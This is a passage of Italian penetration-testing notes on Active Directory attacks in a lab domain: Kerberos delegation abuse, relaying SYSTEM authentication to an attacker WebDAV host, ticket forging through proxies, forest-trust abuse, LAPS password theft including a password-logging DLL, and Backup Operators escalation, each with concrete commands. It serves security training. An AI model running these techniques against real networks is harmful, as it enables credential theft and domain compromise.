4) Usare il tool [SpoolSample](https://github.com/leechristensen/SpoolSample) per forzare il Domain Controller ad autenticarsi via [MS-RPRN](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/d42db7d5-f141-4466-8f47-0a4be14e2fc1)
5) Passare il Ticket

Individuazione di un server con Unconstrained Delegation attivo usando [pywerview](https://github.com/the-useless-one/pywerview): **pywerview get-netcomputer -u [USER] -p [PASSWORD] -t [DC] -unconstrained**  
![image](https://user-images.githubusercontent.com/110602224/199346217-c2900013-a96e-4904-9612-ae08ad576d5e.png)

Esecuzione di Rubeus attraverso una sessione elevata di Meterpreter sul computer compromesso con Unconstrained Delegation attivo: **Rubeus.exe monitor /interval:1**.  
![image](https://user-images.githubusercontent.com/110602224/199346551-2dc9eafc-33b2-4c53-83c7-dd09f6dfb327.png)

![image](https://user-images.githubusercontent.com/110602224/199346782-dbaf81be-c0df-4d98-adaf-b5f9fa14bc18.png)

![image](https://user-images.githubusercontent.com/110602224/199347024-a033b0c0-38d2-4a43-8d97-4d4b706147e0.png)

Link: https://github.com/Zer1t0/ticket_converter  
![image](https://user-images.githubusercontent.com/110602224/199347227-8077b9e8-f042-42c6-b379-231c0a95e34b.png)

![image](https://user-images.githubusercontent.com/110602224/199347303-f64a362d-ca09-4fcb-8d19-3fc5e07ca0dd.png)

![image](https://user-images.githubusercontent.com/110602224/199347396-26b08de2-c793-4dd1-97e5-638cda7c71c1.png)


6. **Kerberos Constrained Delegation**  
Kerberos constrained delegation fu introdotto in Windows Server 2012 R2 per offrire una forma di delegazione sfruttabile dai servizi.  
Constrained delegation limita il servizio sul quale il server specificato può agire per conto dell'utente (limitato al dominio corrente).  
Questa funzione, gestita dei Domain Admins è delegata ai Service Administrators in modo che possano controllare e gestire l'accesso front-end ai servizi.  

Service for User to Proxy (S4U2Proxy) è l'estensione del protocollo Kerberos dedicato alla Constrained Delegation che permette a un servizio di usare il Kerberos Service Ticket per un utente al fine di ottenere un service ticket dal KDC per un servizio back-end.  

In sostanza la Kerberos Constrained Delegation permette agli amministratori di rafforzare i limiti entro cui un servizio può operare per conto di un utente.  

**Esempio**  
Nelle proprietà di questo computer account, in _msDS-AllowedToDelegateTo_ compare una lista di hostname/SPN con i quali l'account può impersonare (in maniera non sicura) alcuni utenti del dominio.  
![image](https://user-images.githubusercontent.com/110602224/199545337-d4dce783-f8af-4f38-83d9-bec32c41af09.png)

Per identificare account con flag _msDS-AllowedToDelegateTo_:  
- **pywerview -get-netcomputer -i \[USER\] -p \[PASSWORD\] --dc-ip \[IP\] --full-data**
- **Get-NetComputer --TrustedToAuth**
- **Get-DomainUser --TrustedToAuth**  

In questo esempio è stato identificato il computer JUMPBOX.  
![image](https://user-images.githubusercontent.com/110602224/199546396-7dbdc88c-3685-42eb-b86f-3443b8d0770d.png)

I ticket di Kerberos contengono un parte con informazioni in clear-text e una parte criptata contenente un altro set di informazioni.  
Il Service Principal Name (SPN) del servizio per il quale è stato richiesto il ticket si trova nella parte non criptata, informazione utile per condurre con successo un attacco basato su questa tecnica.  
Esistono due modi per sfruttare la Kerberos Constrained Delegation:  
- Esecuzione di comandi nel contesto dell'account usato ma la password non è nota
- l'hash della password NTLM dell'account è nota o è derivata dalla password  

Nel primo caso, usando Rubeus e il relativo comando _tgtdeleg_ è possibile ottenere un TGT valido per l'utente corrente e salvarlo per un utilizzo successivo come argomento nel comando di Rubeus _s4u_.  
Il TGT in base64 può essere usato come stringa o come file con lo switch del comando /ticket.  
Se usato come file è importante salvarlo e decodificarlo: **\[IO.File\]::WriteAllBytes("ticket.kirbi",\[Convert\]::FromBase64String("\[CONTENUTO BASE64\"]))**  
![image](https://user-images.githubusercontent.com/110602224/199548750-56d6f587-bd39-41b7-b71f-59e6708c145a.png)

Per sfruttare la Constrained Delegation con Rubeus, come indicato poco sopra, si usa il relativo comando _s4u_ specificando i seguenti parametri:  
- /user:\[USER MACHINE/ACCOUNT\]  
- /rc4:\[NTLM HASH\]  
- /ticket:\[TICKET\] ==> Ottenuto con Rubeus.exe tgtdeleg se l'hash dell'account non era nota  
- /impersonateuser: \[USER TO IMPERSONATE\]  
- /msdsspn: \[SERVICE/SERVER\] ==> Valore contenuto in msDS-AllowedToDelegateTo  
- /altservice: \[SERVICE/SERVER DA AGGIUNGERE\]  
- /dc:\[DOMAIN CONTROLLER\]  
- /ptt ==> per inserire il ticket nella sessione corrente  

In questo esempio è stato importato il TGS per l'account Administrator e si è avuto accesso alla risorsa C$ del client target.  
Lista di SPN comuni: https://adsecurity.org/?page_id=183  
Modificando il valore del parametro /altservice si possono accedere altri servizi.  
![image](https://user-images.githubusercontent.com/110602224/199550624-740a8efa-e8b9-4d96-b595-719e582afcd7.png)


7. **"Kerberos Resource-based Constrained Delegation**  
Constrained Delegation si può usare quando il servizio front-end e la risorsa back-end non sono nello stesso dominio.  
i Service Administrators possono configurare i parametri entro i quali i servizi front-end possono usare specifici account di dominio per accedere alle risorse a cui fanno riferimento.  
L'estensione della Constrained Delegation a più domini connessi tra loro consente di sfruttare l'autenticazione Kerberos.  
Anche S4U2Proxy entra in gioco nella configurazione di Resource-Based Constrained Delegation.  
Il controllo è nelle mani dell'amministratore proprietario della risorsa e tutto si basa sugii attributi della stessa piuttosto che sulla delegazione dei privilegi ai servizi. 

![image](https://user-images.githubusercontent.com/110602224/199604741-6d1c8792-de9b-4bf5-8f3a-56ab5f189bfb.png)

Per modificare il campo di cui sopra non sono necessari prvilegi da Domain Admin o simili, solo i prvilegi su quella proprietà di un oggetto computer.  
Resource-based Constrained Delegation si può sfruttare controllando un account con S4U2Self attivo e avendo i privilegi di modifica sulla proprietà msDS-AllowedToActOnBehalfOfOtherIdentity di un oggetto computer, per includere l'account S4U2Self come principale ed eseguire il processo s4u per ottenere accesso ai servizi compatibili con Kerberos in esecuzione sul sistema.  

7.1 **Kerberos Resource-Based Constrained Delegation Computer Object Take Over**  
Il privilegio di scrittura su un oggetto computer dell'Active Directory consente di eseguire del codice con privilegi elevati nel computer.  
Esempio di attacco:  
- Esecuzione del codice nel computer W10-DESKTOP01 come utente ELS\Attacker  
- ELS\Attacker ha privilegi di scrittura sul computer W10-DESKTOP02  
- Sono in uso le policies di default per quanto riguarda l'aggiunta di nuovi computer il che significa che non servono amministratori per aggiungere un oggetto computer NONEXISTENT  
- ELS\Attacker usa il privilegio di scrittura sul computer W10-DESKTOP02 e aggiornando msDS-AllowedToActOnBehalfOfTheIdentity per consentire al computer NONEXISTENT di impersonare qualsiasi utente del dominio su W10-DESKTOP02  
- Il valore di msDS-AllowedToActOnBehalfOfTheIdentity comporta che W10-DESKTOP02 si fidi di NONEXISTENT. Questo significa che i ticket Kerberos per l'account NONEXISTENT$ possono essere richiesti impersonando qualsiasi utente del dominio  

Primo passaggio per condurre l'attacco consiste nel verificare il valore di ms-ds-machineaccountquota, comando: **\[POWERVIEW\] Get-Domain Object -Identity 'cn=ELS,cn=LOCAL' -Domain ELS.LOCAL**  
![image](https://user-images.githubusercontent.com/110602224/199608060-42836cce-2e02-4771-8d26-c09ad549c78f.png)

Il controller di dominio deve avere in uso una versione di Windows Server non inferiore alla 2012 R2.  
Comando per verificare la versione del sistema operativo: **\[POWERVIEW\] Get-DomainController**  
![image](https://user-images.githubusercontent.com/110602224/199608305-8605e154-0598-49d0-b898-25380248c010.png)

Controllo che il computer target non abbia l'attributo msDS-AllowedToActOnBehalfOfTheIdentity.  
![image](https://user-images.githubusercontent.com/110602224/199608610-12002fd7-be4e-4d3e-ac91-e863e490b813.png)

Usando [PowerMAD](https://github.com/Kevin-Robertson/Powermad) si crea l'account macchina NONEXISTENT col comando di seguito.  
![image](https://user-images.githubusercontent.com/110602224/199608948-869cd820-1aec-470a-b25e-fc3575d82322.png)

Esecuzione del comando **Get-DomainAccount NONEXISTENT** per trovare il nuovo SID del computer.  
![image](https://user-images.githubusercontent.com/110602224/199609287-1dd4fb96-c433-4624-ae83-364f387eb9dc.png)

![image](https://user-images.githubusercontent.com/110602224/199609431-3f2f13f7-63d9-462b-bbc0-6211e3c86b27.png)
![image](https://user-images.githubusercontent.com/110602224/199609557-6102363a-63cf-481f-9712-a25e0cfcf516.png)
![image](https://user-images.githubusercontent.com/110602224/199609633-6143278e-2b32-4996-bd0d-fcf99a7f315a.png)
![image](https://user-images.githubusercontent.com/110602224/199609753-a0b2a67e-4c02-428b-8491-0bae2dbbab6f.png)
![image](https://user-images.githubusercontent.com/110602224/199609824-090234fc-44d8-4d0b-a6c4-aa2c09e3f34d.png)

7.2 **Kerberos Resource-based Constrained Delegation via Image Change**  
Utenti con privilegi minimi, utente, posso abusare della funzionalità di cambiare l'immagine di profilo per, in determinate circostanze, ottenere permessi di rete come SYSTEM dal computer e di inoltrari al servizio LDAP di ActiveDirectory.  
In questo modo è possibile configurare la Kerbeos Resource-based Constrained Delegation per quel specifico computer in quanto ha diritto di scrittura sull'attributo "msDS-AllowedToDelegateOnBehalfOfOtherIdentity".  

Sebbene questa tecnica richieda accesso alla GUI, è possiible bypassare questo "ostacolo" e ottenere full-privilege in sistemi con Windows 10.  
I requisiti sono:  
- Esistenza di un account con un SPN associato: questo account sarà associato all'attributo "msDs-AllowedToDelegateOnBehalfOfOtherIdentity" sul sistema e sarà usato per i protocolli S4U2Self e S4U2Proxy.
- Feature di WebDAV Redirector: deve essere installato nel computer della vittima per eseguire il relay dell'autenticazione su LDAP in quanto WebDAV non supporta la firma (il signing) come SMB.  
- Record DNS che risolve le query al computer dell'attaccante in quanto WebDAV si autentica automaticamente solo sugli host nella zona intranet per impostazione predefinita
- Accesso alla GUI per la ricerca di un immagine. Uno dei passaggi è eseguito come SYSTEM ed è quello che deve essere inoltrato usando il percorso \\attackerwebdav@80\badpic.jpg  

![image](https://user-images.githubusercontent.com/110602224/199751408-897df038-6bb2-4c9a-b130-55f7e737d8fc.png)

Mentre in Windows 10 il client WebDAV è installato d default, in Windows Server 2016 e successivi deve essere attivato manualmente.  
![image](https://user-images.githubusercontent.com/110602224/199751927-8f11b927-e074-4591-aab5-dcf7f5c1419b.png)

L'attibuto ACL "Create all child objects" è assegnato di default a tutti gli utenti autenticati nella zona DNS integrata di Active Directory (ADIDNS).  
Questo implica il fatto che ogni utente autenticato può creare record DNS.  
![image](https://user-images.githubusercontent.com/110602224/199752767-4898eca5-7db8-4747-84e0-f29731cdf304.png)

In assenza di accesso GUI, il tool [Change Lockscreen](https://github.com/nccgroup/Change-Lockscreen) consente di effettuare un'autenticazione di rete come SYSTEM avviando un richiesta/procedura di sostituzione dell'immagine della schermata di blocco.  
![image](https://user-images.githubusercontent.com/110602224/199753591-a1c2c5be-6d5b-41ed-9b0a-cd5b8240d326.png)

Nel caso in cui sia attivo Windows Spotlight (funzionalità che scarica e alterna in automatico le immagini della chermata di blocco) l'autenticazione come SYSTEM non avviene. Per questo motivo il tool di cui sopra disattiva Windows Spotlight e configura l'immagine specificata negli argomenti.  
Il tool va oltre, crea una copia dell'immagine originale e la ripristina una volta terminato l'attacco.  

Per rendere disponibile l'immagine si può usare lo script ntlmrelayx.py di Impacket con argomento _--serve-image \[PERCORSO IMMAGINE\]_  
![image](https://user-images.githubusercontent.com/110602224/199754828-f1f19de1-7c40-41f7-b1f7-db4943423784.png)

Proseguendo con l'attacco, è necessario avere un accoount con un Service Principal Name e il tool [Powermad](https://github.com/Kevin-Robertson/Powermad) può essere usato per sfruttare il comportamento di default dell'attributo di Active Directory "msDs-MachineAccountQuota" per aggiungere un account computer.  
![image](https://user-images.githubusercontent.com/110602224/199757246-c0f78f49-b266-4db6-85cb-fe9ba18e8624.png)

Il passaggio successivo consiste nel creare un record DNS che punti al computer dell'hacker.  
![image](https://user-images.githubusercontent.com/110602224/199757617-45b5b977-bdb7-44d1-bef8-9556dde3dfb9.png)

A questo punto, con il record DNS che punta all'indirizzo IP dell'hacker e con lo script ntlmrelayx.py in esecuzione nel computer dell'attaccante, si invoca il comando per moificare l'immagine della schermata di blocco: **change-lockscreen -webdav \\attacker@80\**  

![image](https://user-images.githubusercontent.com/110602224/199758246-c88154b6-0e00-4fe1-9e84-aa57acc6ca5b.png)
Dalla figura sopra si ha conferma che l'account macchina creato in precedenza può impersonare utenti sul computer vittima via S4U2Prozy.  
![image](https://user-images.githubusercontent.com/110602224/199758729-1d0019dd-3ecb-4408-b509-3db89da30abc.png)

Il ticket si può salvare in formato .kirbi o usato per eseguire comandi sul computer remoto impersonando un altro utente.  


8. **Kerberos Attacks Using Proxies**  
La presenza di un collegamento di rete diretto alla rete interna facilità l'eecuzione e favorisce il successo degli attacchi contro Kerberos.  
In alcuni casi però capitano situazioni particolari come eseguire attacchi contro Kerberos via host compromessi che si trovano all'interno di una DMZ agendo come proxy (socks proxy).  

**Esempio**  
![image](https://user-images.githubusercontent.com/110602224/199760245-275332c3-1712-49c2-97d9-008397df3cce.png)

Accesso alla rete tramite un host compromesso che si trova nella DMZ.  
I requisiti sono:  
- Host Linux con Impacket pronto all'uso  
- [Proxychains](https://github.com/haad/proxychains)  
- NT Hash o AES Keys dall'account krbtgt o qualiasi account utente  
- Domain SID
- Domain FQDN  
- Utente da impersonare

Nello scenario preso in considerazione l'accesso alla rete interna passa da un proxy du porta 1080/TCP nel client "DMZ Web Application".  
Tool usati: modulo autoroute di Metasploit e modulo socks proxy.  
Disattivare l'opzione proxy_dns nella configurazione di Proxychains.  
![image](https://user-images.githubusercontent.com/110602224/199769972-36144606-1bf2-4e13-8bb0-19bae01e9930.png)

Nel file hosts bisogna includere i nomi FQDN dei computer target.  
A questo punto è possibile lanciare attacchi contro il protocollo Kerberos tramite proxy.  
Per configurare Kerberos nell'host linux: http://passing-the-hash.blogspot.com/2016/06/nix-kerberos-ms-active-directory-fun.html?m=1  

Lo script [kerbrute](https://github.com/TarlogicSecurity/kerbrute) ha lo scopo di eseguire attacchi di bruteforcing contro Kerberos usando la libreria di Impacket.  
Tra le sue funzionalità principali è in grado identificare utenti validi e di salvare i TGT nel caso trovi un set di credenziali valide.  

È importante verificare che l'ora e la data combacino con quella in uso nel Domain Controller in quanto uno scarto superiore ai 5 minuti produce errori.  
Il comando **net time** aiuta a individuare data e ora in un sistema remoto
Successivamente bisogna impostare il percorso il file cache dei ticket di Kerberos nella variabile d'ambiente al valore del ticket precedente: export KRB5CCNAME=PATH_TO_TICKET
![image](https://user-images.githubusercontent.com/110602224/199773924-52905491-f03c-41f4-a4dc-bc552421e99d.png)

Il tool [evil-winrm](https://github.com/Hackplayers/evil-winrm) supporta l'autenticazione Kerberos per Windows Remote Management.  
Utile per lateral movement usato insieme a proxychains e l'utlimo ticket ottenuto.  
![image](https://user-images.githubusercontent.com/110602224/199774748-abbc960a-05e0-44bd-a6c5-012d0c85f914.png)

Nel caso in cui l'hash dell'account krbtgt sia stata catturata, si possono generare ticket usando lo script ticketer.py di impacket.  
![image](https://user-images.githubusercontent.com/110602224/199775878-65f9626c-9112-4415-937c-bb003ce8f17a.png)

In alternativa, se esiste già un ticket in formato .kirbi si può convertire in formato .ccache e viceversa usando uno script [ticketconverter](https://github.com/Zer1t0/ticket_converter).  
![image](https://user-images.githubusercontent.com/110602224/199776219-5be3ee52-a88b-4074-abdf-a173c6f4538d.png)

Qualsiasi script di impacket o comandi psexec si possono lanciare attraverso proxychains e usare gli switch -k e --no-pass per autenticazione kerberos prive di password.  
![image](https://user-images.githubusercontent.com/110602224/199776612-24a86302-d719-4497-82df-5dd57e8c5afa.png)


9. **Abusing Forest Trusts**  
Microsoft definisce due tipi di Trust:  
- Trust Inter-Forest che si creano tra due foreste
- Trust Intra-Forest che si creano tra domini nella stessa foresta

I Trust sono sempre definiti tra Domini mentre i Forest Trust solo tra Root Domain delle diverse Foreste. 
In una singola foresta i domini si fidano l'un l'altro e per questo motivo è possibile elevare i privilegi da un dominio compromesso a un altro.  
Un Dominio di Active Directory non rappresenta un confine di sicurezza mentre una Foresta lo è.  
![image](https://user-images.githubusercontent.com/110602224/199777950-ab5b127d-13ca-4ab3-b733-1503762a0c2c.png)

Facendo riferimento all'immagine sopra, quando la Foresta A vuole accedere alle risorse nella foresta B, il TGT (Kerberos Ticket Granting Service) è valido nel Root Domain della Foresta A.  
Windows ha però bisogno di un ticket valido per accedere a risorse esterne al proprio dominio (sia questo interno o esterno alla Foresta).  
Il ticket della foresta A non è valido nella foresta B in quanto l'hash di crittografia dell'account krbtgt per firmare e criptare i ticket è diversa da quella in uso nella Foresta B.  

![image](https://user-images.githubusercontent.com/110602224/199779083-e1ead860-dc2d-4fc9-a546-11f1bc33a083.png)
Dal momento che tra le Foreste A e B esiste un Trust bidirezionale, i Domain Controller possono rilasciare ticket firmati e criptati con la inter-realm key e questo ticket è riconosciuto in entrame le Foreste.  

**Golden Tickets and SID Filtering**  
Come già descritto precedentemente, [mimikatz](https://github.com/gentilkiwi/mimikatz) supporta la funzionalità SID History di Active Directory permettendo di elevare i privilegi da un Dominio a un altro all'interno della stessa Foresta.  
![image](https://user-images.githubusercontent.com/110602224/199780469-c7fec33d-c8f2-474b-a0c0-a8d803181ec3.png)
![image](https://user-images.githubusercontent.com/110602224/199780700-f845be6e-6dec-4fc2-b3db-85cacf5acf05.png)

Dopo che il ticket è inserito in memoria è possibile navigare tra le risorse della Foresta B senza errori.  
Il fatto che le risorse di un'altra Foresta siano liberamente leggibili, implica che "l'estensione" [PAC](https://stealthbits.com/blog/what-is-the-kerberos-pac/) non sia analizzata dal Domain Controller che semplicemente firma il ticket con la inter-realm key per la Foresta B nonostante contenga un gruppo di cui l'utente non fa parte.  
Memberships nel Dominio della Foresta B sono aggiunte al PAC sebbene alcuni SID sono filtrati e rimossi dal meccanismo di sicurezza SID Filtering (rimuove SID che non fanno parte della Foresta A).  
È comunque possibile impersonare utenti nella Foresta A e se qualcuni di questi ha privilegi speciali anche nella Foresta B, sono compromessi in entrambe le Foreste.  

**SID Filtering Relaxation**  
Il tool "netcom" come indicato in [questo articolo](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc773010%28v%3dws.10%29) Microsoft offre la poassibilità di attivare il SID History per i trust tra Foreste.
Comando: **netcom /trust /d:forest-a.local forest-b.local /enablesidhistory:yes**  

Link: https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/e9a2d23c-c31e-4a6f-88a0-6646fdb51a3c?redirectedfrom=MSDN
![image](https://user-images.githubusercontent.com/110602224/199784092-1007d074-15cf-4f3c-964e-d67f18c2ceb4.png)

Link: https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/55fc19f2-55ba-4251-8a6a-103dd7c66280
![image](https://user-images.githubusercontent.com/110602224/199784376-2c7f6359-887a-4f96-b9ff-78ab55da174d.png)

Link: https://dirkjanm.io/active-directory-forest-trusts-part-one-how-does-sid-filtering-work/
![image](https://user-images.githubusercontent.com/110602224/199784926-576103d4-7608-426e-80fd-2b175669fe3d.png)


10. **LAPS (Local Administrator Password Solutions)**  
[LAPS](https://www.microsoft.com/en-us/download/details.aspx?id=46899) di Microsoft è stato pensato per gestire le password locali dei computer uniti al dominio.  
Il componente client-side del tool installato nei computer genera una password casuale, aggiorna l'attributo LAPS a livello di Dominio e cambia la password locale.  
La configurazione LAPS è gestibile trami le GPO impostano criteri di complessità, durata, lunghezza delle password.  
Lo scopo di LAPS è di limitare, se non rimuovere, la possibiltà che si verifichino attacchi d tipo Pass-the-Hash in ambienti ei quali gli utenti loggano nei computer senza uso di credenziali.  
![image](https://user-images.githubusercontent.com/110602224/199925586-1e9941e9-f709-43cd-8346-88dff17353a5.png)

L'installazione iniziale di LAPS aggiunge attributi agli oggetti:  
- ms-mcs-AdmPwd: Clear-text password
- ms-mcs-AdmPwdExpirationTime: Data di scadenza della password. Una volta raggiunta il client LAPS è forzato a generare una nuova password

L'installazione deli client LAPS nei computer permette di gestire le password degli account Administrator locali.  
Possibilità di delegare ai computer diritti di scrittura sui nuovi attributi.
Possibilità di delegare gli attributi LAPS del computer a un gruppo di utenti per verificare o forzare un cambiamento nelle password LAPS (intende a un intero gruppo?)  
Creazione di una nuova GPO per attivare e configurare la gestione di LAPS.  

L'attributo ms-mcs-AdmPwd che memorizza le password in clear-text è considerato e flaggato come riservato. QUeso significa che di default solo i Domain Admins possono vedere e operare su questo attributo anche se questi privilegi possono essere delegati.  
L'attributo ms-mcs-AdmPwdExpirationTime è flaggato come "regolare" e memorizza le informazioni sulla scadenza della password in formato integer8 (8 byte).  
Il fatto che sia flaggato come "regolare" implica che ogni utente autenticato al Dominio può:
- enumerare i computer gestiti con LAPS
- recuperare informazioni sul cambiamento delle password confrontando il tempo nella GPO con quello dichiarato dall'agente LAPS installato nel computer  
- identificare quali computer non sono più gestiti tramite LAPS in quanto il tempo di scadenza della password risulta essere un momento nel passato  

La LAPS GPO Client-Side Extension (CSE) è in funzione nel client. Il refresh dei Criteri di Gruppo avviene ogni 90 minuti per impostazione predefinita.. 
Un offset casuale da 0 a 30 minuti è aggiunto per assicurarsi che i client non eseguano il refresh nello stesso momento.  
La LAPS CSE verifica il valore dell'attributo ms-mcs-AdmPwdExpirationTime e se questo risulta essere inferiore della data/ora correnti viene generata una nuova password secondo la GPO, e i valori di entrambi gli attributi sono aggiornati.  

**LAPS Recon - Local Machine**  
L'installazione della LAPS CSE (Group Policy) dopo l'installazione del client LAPS comporta la comparsa di una nuova DLL al percorso C:\Program Files\LAPS\CSE\Admpwd.dll e viene configurata la chiave di Registro di Sistema HKLM\Software\Microsoft\WindowsNT\CurrentVersion\Winlogon\GPExtensions.  
![image](https://user-images.githubusercontent.com/110602224/199929501-c2409172-ae4e-4007-bf88-c6c69c2e421e.png)

Comandi utili da usare con Powershell per identificare la presenza di LAPS:  
- **Get-ChildItem "C:\Program Files\LAPS\CSE\Admpwd.dll"**
- **Get-FileHash "C:\Program Files\LAPS\CSE\Admpwd.dll"**
- _PowershellV5_ **Test-Path "HKLM\Software\Microsoft\WindowsNT\CurrentVersion\Winlogon\GPExtensions"**  

**LAPS Recon - Active Directory**  
I Computer gestiti tramite LAPS hanno due nuovi attributi e una GPO per la gestione delle policy delle password. 
Per verificare la presenza degli attributi LAPS: **Get-ADObject "CN=ms-mcs-AdmPwd,CN=Schema,CN=Configuration,DC=ELS,DC=LOCAL"**  
Per verificare la presenza di GPO che contengono il termine "LAPS" nel loro nome: **Get-DomainGPO -Identity "\*LAPS\*"**  
![image](https://user-images.githubusercontent.com/110602224/199931291-baf28b01-bc53-49bd-b3eb-ae4c8575eb3c.png)

La configurazione LAPS è contenuta in "Registry.pol" in "gpcfilesyspath".  
Il tool [GPRegistryPolicy](https://github.com/PowerShell/GPRegistryPolicy) permette di decodificare ed estrarre informazioni dai file .pol.  
Comando: **Parse-PolFile \\ELS.LOCAL\SYSVOL\ELS.LOCAL\Policies\\[GUIDNAME\]\Machine\Registry.pol**  

Le informazioni estratte comprendono:  
- La complessità della password  
- La lunghezza della password  
- La durata della password  
- L'account per la gestione di LAPS  

![image](https://user-images.githubusercontent.com/110602224/199932520-38e52273-164c-42d2-8106-85a419bb968f.png)

Tramite PowerView è possibile identificare tutti i computer dove è stata applicaa la GPO di LAPS.  
Comandi: **Get-DomainOU -GPLink \[GUIDNAME\] -Properties DistinguishedName**  
**Get-DomainComputer -SearchBase \[LDAP://DistinguishedName\] -Properties DistringuishedName**  
![image](https://user-images.githubusercontent.com/110602224/199933293-93c788aa-8a9d-4efb-980f-6e5d74adc8ce.png)

Sempre usando PowerView è possibile individuare lo stato di delegazione dei privilegi sull'attributo _Password View Access_ che permette di vedere in clear-text le password memorizzate nello store di LAPS.  
Comando: **Get-NetOU -FullData | Get-ObjectACL -ResolveGUIDs | Where-Object (($._Object-Type -like "ms-Mcs-AdmPwd") -and ($._ActiveDirectoryRights -match "readProperty")) | For-EachObject ($_ | Add-Member NoteProperty "IdentitySID" $(Convert-NameToSid $._IdentityReference) .SID; $_)**  
![image](https://user-images.githubusercontent.com/110602224/199934959-e0a0dc2b-b43a-4eb7-a842-3ab3690e3d7e.png)

![image](https://user-images.githubusercontent.com/110602224/199935048-73b4c6f5-3d28-4e2e-b2b6-9c794fe5e424.png)

I Gruppi con delega _AllExtendedRights_ su un contenitore OU di computer gestiti via LAPS, hanno permessi di lettura segli attributi reisrvati incluso mc-msc-AdmPwd che contiene la password in clear-text. Per individuare questi gruppi: **Find-AdmPwdExtendedRights -Identity workstations | % {$_.ExtendedTightHolders}**  
![image](https://user-images.githubusercontent.com/110602224/199937988-6e01e012-fef5-40ce-965d-3697fc92bfe8.png)

10.1 **LAPS Exploitation**  
Avendo i privilegi giusti è possibile recuperare una lista di computer con LAPS e le relative password.  
Comando: **Get-ADComputer -filter {mc-mcs-AdmPwdExpirationTime -like "\*"}**  
![image](https://user-images.githubusercontent.com/110602224/199938713-39aef70c-5285-4814-8d99-ff387308f40b.png)

Se si ha il Cmdlet di LAPS installato col seguente comando è possibile ottenere le password.  
Comando: **Get-AdmPwdPassword -ComputerName \[TARGET\] | fl**  
![image](https://user-images.githubusercontent.com/110602224/199941768-ea8fb7e2-5907-49a6-b88e-7a91eb81d42f.png)

Sfruttando invece l'attributo ms-msc-AdmPwdExpirationTime (leggibile da tutti gli utenti) si può recuperare la lista dei computer gestiti e non più gestiti via LAPS.  
Comando: **Get-ADComputer -filter {mc-mcs-AdmPwdExpirationTime like "\*"} -Properties  -mc-mcs-AdmPwdExpirationTime**  

Se si è riusciti a compromettere un computer gestito da LAPS, si può modificare il valore in modo tale che la password non venga modificata in automatico.  
Comando: **Set-DomainObject -Identity \[TARGET COMPUTER\] -set @{"mc-mcs-AdmPwdExpirationTime"="\[NUOVO VALORE\]"} -Verbose**  
![image](https://user-images.githubusercontent.com/110602224/199943062-16c3784f-33b7-4b55-9084-53cf16b21652.png)

Link: https://github.com/leoloobeek/LAPSToolkit
![image](https://user-images.githubusercontent.com/110602224/199946217-299e15fd-104d-46c0-9bf6-91d3fcf73502.png)

Nei computer locali il mantenimento delle funzionalità di LAPS è affidato al file AdmPwd.dll.  
Non essendoci in essere controlli di integrità sul file, è possibile sostituirlo con una versione modificata che tenga traccia delle password generate.  
A tale scopo si può modificare il codice sorgente del progetto [AdmPwd Project](https://github.com/GreyCorbel/admpwd) e compilare la dll.  
Link: https://github.com/GreyCorbel/admpwd/blob/master/Main/AdmPwd/AdmPwd.cpp  
![image](https://user-images.githubusercontent.com/110602224/199946941-6f09f65e-7867-4e92-8f6c-4e64bdd2304b.png)
![image](https://user-images.githubusercontent.com/110602224/199947101-bf15d25b-bb72-407a-a01d-4d025351bcf5.png)
![image](https://user-images.githubusercontent.com/110602224/199947242-bf4a3763-62c6-4b4b-92be-2b4d00fa68f9.png)  
Link: https://github.com/GreyCorbel/admpwd/blob/master/Main/AdmPwd.PS/Main.cs  
![image](https://user-images.githubusercontent.com/110602224/199947376-6d8a3089-af89-4704-8f9a-d33d935320e5.png)
![image](https://user-images.githubusercontent.com/110602224/199947539-654f9870-8dee-4cf4-80f7-461a62752f46.png)  
Link: https://github.com/GreyCorbel/admpwd/blob/master/Main/AdmPwd.Utils/PSTypes.cs  
![image](https://user-images.githubusercontent.com/110602224/199947774-75b54829-d267-41b6-9178-10509cbd711a.png)


11. **ACLs on AD Objects**  
Agli account di qualsiasi tipo è possibile delegare privilegi critici/importanti senza che siano parte dei gruppi di amministratori.  
Questo è possibile assegnando direttamente i permessi usando le ACL sugli oggetti di Active Directory. Tali account prendono il nome di Shadow Admin Accounts.  

Questi account sono particolarmente interessanti in quanto possono avere i requisiti di Administrator sufficienti per eseguire un tipo di attacco ma al tempo stesso non sono profili di alto interesse (high-profile) non essendo veri e propri amministratori.  
Il tool [ACLight](https://github.com/cyberark/ACLight) automatizza la scoperta di utenti del dominio, Shadow Admin Account inclusi.  
In Powershell si importa il modulo _ACLight2.psm1_ e si lancia il comando **Start-ACLAnalysis**.  
![image](https://user-images.githubusercontent.com/110602224/199954895-f0a4ce96-f3d6-40dd-9683-ab60392245ac.png)
![image](https://user-images.githubusercontent.com/110602224/199954970-f7713d5a-7072-4db4-8769-a80e949652fc.png)


12. **Backup Operators**  
Il gruppo _Backup Operators_ è un gruppo predefinito di Windows i cui membri ereditano gli attributi _SeBackupPrivilege_ e _SeRestorePrivilege_.  
Compromettere un account membro può risultare in una privilege escalation fino a SYSTEM.  
I Backup Operators hanno il permesso di eseguire operazioni con privilegi elevati usando le seguenti Windows API Calls:  
- [CreateFile](https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea): uno dei parametri accettati da CreateFile è dwFlagsAndAttributes. Impostare tale valore su _FILE\_FLAG\_BACKUP\_SEMANTICS (DWORD 0x2000000)_ permette al Backup Operator di creare un file in qualsiasi percorso del sistema.  
- [RegCreateKeyEx](https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regcreatekeyexa): crea una chiave di registro se non esiste e restituisce un handle. Uno dei parametri accettati è dwOptions. Impostando il suo vale a _REG\_OPTION\_BACKUP\_RESTORE DWORD (0x00000004L)_ si può aggiungere o modificare una voce di Registro di Sistema in quanto tali operazioni sono considerate un ripristino nonostante le DACL in essere.  

È richiesta un shell interattiva.  
Per eseguire l'attacco:  
- individuare un servizio che funzioni con permessi SYSTEM e che possa essere avviato da un utente regolare  
- sovrascrivere la configurazione del servizio in HKLM\CurrentControlSet\Services  
- riavviare il servizio

Un servizio target di esempio potrebbe essere _dwappushservice_, parte dei "Telemetry and Data Collection Services", installato di default su Windows 10 e Windows Server 2016 e 2019.  
Il comando **sd shadow \[SERVICE NAME\]** mostra una lista di dettagli sul servizio come i permessi per gli _interactive users (UI)_ che in questo caso hanno diritti sufficienti per avviare il servizio, _(RP)_.  
